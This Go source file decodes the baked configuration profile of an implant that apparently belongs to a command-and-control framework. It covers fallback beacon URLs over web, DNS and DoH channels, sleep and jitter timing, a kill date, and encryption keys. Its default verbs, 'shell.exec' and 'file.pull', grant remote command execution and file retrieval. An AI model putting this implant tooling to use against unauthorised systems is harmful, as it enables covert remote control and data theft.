// Package profile decodes the baked profile (architecture.md Sec 5.1): the
// base64url JSON map every build unit emits, the language-neutral wire
// contract between the build pipeline and an implant. The dev shape reads
// the same knobs from ROD_* environment variables, mirroring the reference
// implant's dev shape, so a tree checkout runs against a live teamserver
// with no build step.
package profile

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"
)

// Profile is the decoded bake: the egress endpoints, the contact cadence
// and fuse, the envelope settings, and the verbs the artifact may run.
type Profile struct {
	EnrollURL          string
	FallbackEnrollURLs []string
	Mode               string
	KillDate           string
	SleepSeconds       float64
	JitterSeconds      float64
	EnrollPath         string
	UserAgent          string
	RequestTimeout     time.Duration
	CaCert             string
	TlsTrust           string
	Envelope           string
	ContactEnvelope    string
	EnvelopeKey        string
	Token              string
	Verbs              []string
}

// Decode parses a baked profile: the base64url (no padding) bytes of a JSON
// object. Unknown keys are ignored -- the evolution rules' additive-only
// discipline runs both directions.
func Decode(baked string) (Profile, error) {
	var p Profile
	if baked == "" {
		return p, fmt.Errorf("no baked profile: the artifact was built without one")
	}
	raw, err := base64.RawURLEncoding.DecodeString(strings.TrimSpace(baked))
	if err != nil {
		return p, fmt.Errorf("baked profile is not base64url: %w", err)
	}
	var m map[string]any
	if err := json.Unmarshal(raw, &m); err != nil {
		return p, fmt.Errorf("baked profile is not JSON: %w", err)
	}
	str := func(key string) string {
		if v, ok := m[key].(string); ok {
			return v
		}
		return ""
	}
	p.EnrollURL = str("enrollURL")
	if urls, ok := m["fallbackEnrollURLs"].([]any); ok {
		for _, entry := range urls {
			if s, ok := entry.(string); ok && s != "" {
				p.FallbackEnrollURLs = append(p.FallbackEnrollURLs, s)
			}
		}
	}
	p.Mode = str("mode")
	p.KillDate = str("killDate")
	p.SleepSeconds = seconds(str("sleep"), 30)
	p.JitterSeconds = seconds(str("jitter"), 10)
	p.EnrollPath = str("enrollPath")
	if p.EnrollPath == "" {
		p.EnrollPath = "/implants/enroll"
	}
	p.UserAgent = str("userAgent")
	p.RequestTimeout = time.Duration(seconds(str("requestTimeout"), 30) * float64(time.Second))
	p.CaCert = str("caCert")
	p.TlsTrust = str("tlsTrust")
	if p.TlsTrust == "" {
		p.TlsTrust = "pinned"
	}
	p.Envelope = str("envelope")
	p.ContactEnvelope = str("contactEnvelope")
	p.EnvelopeKey = str("envelopeKey")
	p.Token = str("token")
	if verbs := str("verbs"); verbs != "" {
		p.Verbs = strings.Split(verbs, ",")
	}
	return p, nil
}

// EnrollWalk applies the enroll path onto every front: the path is
// replaceable per the malleable profile, scheme and authority stand. The
// non-web families carry their own dial data in the path, so the knob
// never touches them.
func (p Profile) EnrollWalk() []string {
	apply := func(url string) string {
		at := strings.Index(url, "://")
		if at < 0 || strings.HasPrefix(url, "tcp://") ||
			strings.HasPrefix(url, "dns://") || strings.HasPrefix(url, "doh://") {
			return url
		}
		authority := url[at+3:]
		if slash := strings.Index(authority, "/"); slash >= 0 {
			authority = authority[:slash]
		}
		return url[:at] + "://" + authority + p.EnrollPath
	}
	walk := []string{apply(p.EnrollURL)}
	for _, fallback := range p.FallbackEnrollURLs {
		walk = append(walk, apply(fallback))
	}
	return walk
}

// KillDatePassed reports whether the baked fuse has blown. An empty or
// unparsable kill date is the open-ended shape: never a refusal.
func (p Profile) KillDatePassed(now time.Time) bool {
	if p.KillDate == "" {
		return false
	}
	kill, err := time.Parse(time.RFC3339, p.KillDate)
	if err != nil {
		return false
	}
	return now.After(kill)
}

// FromEnv builds the dev shape: the same knobs from ROD_* variables, the
// documented developer posture of the reference implant.
func FromEnv() (Profile, bool) {
	url := os.Getenv("ROD_ENROLL_URL")
	if url == "" {
		return Profile{}, false
	}
	p := Profile{
		EnrollURL:       url,
		Mode:            envDefault("ROD_MODE", "poll"),
		KillDate:        os.Getenv("ROD_KILL_DATE"),
		SleepSeconds:    seconds(envDefault("ROD_SLEEP", "30s"), 30),
		JitterSeconds:   seconds(envDefault("ROD_JITTER", "10s"), 10),
		EnrollPath:      "/implants/enroll",
		Envelope:        envDefault("ROD_ENVELOPE", "none"),
		ContactEnvelope: envDefault("ROD_CONTACT_ENVELOPE", "aesgcm"),
		EnvelopeKey:     os.Getenv("ROD_ENVELOPE_KEY"),
		Token:           os.Getenv("ROD_DEPLOY_TOKEN"),
		Verbs:           []string{"shell.exec", "file.pull"},
	}
	if fallbacks := os.Getenv("ROD_FALLBACK_ENROLL_URLS"); fallbacks != "" {
		for _, entry := range strings.Split(fallbacks, ",") {
			if entry != "" {
				p.FallbackEnrollURLs = append(p.FallbackEnrollURLs, entry)
			}
		}
	}
	if verbs := os.Getenv("ROD_VERBS"); verbs != "" {
		p.Verbs = strings.Split(verbs, ",")
	}
	return p, true
}

func envDefault(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

// seconds parses the profile's duration strings ("<n>s") into seconds; a
// bare number reads as seconds too. The fallback covers a missing key.
func seconds(text string, fallback float64) float64 {
	if text == "" {
		return fallback
	}
	if d, err := time.ParseDuration(text); err == nil {
		return d.Seconds()
	}
	if f, err := strconv.ParseFloat(text, 64); err == nil {
		return f
	}
	return fallback
}
